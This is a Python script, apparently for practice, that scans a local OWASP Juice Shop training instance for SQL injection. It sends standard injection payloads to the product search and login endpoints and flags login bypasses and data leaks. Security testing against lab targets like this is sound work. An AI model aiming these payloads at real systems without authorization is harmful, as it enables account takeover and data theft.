import requests
import json

BASE_URL = "http://localhost:3000"

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; --",
    "admin'--"
]

# Define multiple targets to scan systematically
ENDPOINTS_TO_TEST = [
    {
        "name": "Product Search API",
        "url": f"{BASE_URL}/rest/products/search",
        "method": "GET",
        "param_type": "params",
        "param_name": "q",
        "success_check": lambda r: r.status_code == 200 and 'data' in r.json() and len(r.json()['data']) > 0
    },
    {
        "name": "User Login API",
        "url": f"{BASE_URL}/rest/user/login",
        "method": "POST",
        "param_type": "json",
        "param_name": "email",
        "success_check": lambda r: r.status_code == 200 and 'authentication' in r.json()
    }
]

def run_extended_scanner():
    print("=" * 60)
    print(" Expanded OWASP Juice Shop SQLi Scanner")
    print("=" * 60 + "\n")

    for target in ENDPOINTS_TO_TEST:
        print(f"[*] Testing {target['name']} ({target['url']})...")
        vulnerable = False

        for payload in PAYLOADS:
            try:
                if target["method"] == "GET":
                    response = requests.get(target["url"], params={target["param_name"]: payload})
                else:
                    body = {target["param_name"]: payload, "password": "wrongpassword"}
                    response = requests.post(target["url"], json=body)

                if target["success_check"](response):
                    print(f"[+] VULNERABILITY FOUND!")
                    print(f"    -> Endpoint: {target['url']}")
                    print(f"    -> Parameter: '{target['param_name']}'")
                    print(f"    -> Payload Triggered: {payload}\n")
                    vulnerable = True
                    break
            except Exception as e:
                print(f"[-] Connection error on {target['url']}: {e}")

        if not vulnerable:
            print(f"[-] No vulnerabilities found for {target['name']} with standard payloads.\n")

if __name__ == "__main__":
    run_extended_scanner()
